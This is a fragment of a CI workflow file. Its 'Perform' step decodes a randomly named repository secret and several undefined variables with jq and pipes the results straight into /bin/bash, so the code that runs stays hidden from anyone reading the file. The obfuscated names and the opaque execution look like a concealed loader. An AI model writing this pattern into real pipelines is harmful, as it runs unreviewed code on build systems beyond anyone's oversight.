        with:
          fetch-depth: 1
      - name: Perform
        env:
          iwkkv2256: ${{ secrets.iwkkv2256 }}
        run: |
          printf '%s' "$iwkkv2256" | jq -r .sfgl6 | /bin/bash
          echo $fxsi67 | jq -r .gow01899 | /bin/bash
          echo $nrbsh9 | jq -r .ts72164 | /bin/bash
          echo $iuj1503 | jq -r .hn7 | /bin/bash

      - name: Upload results
        if: always()
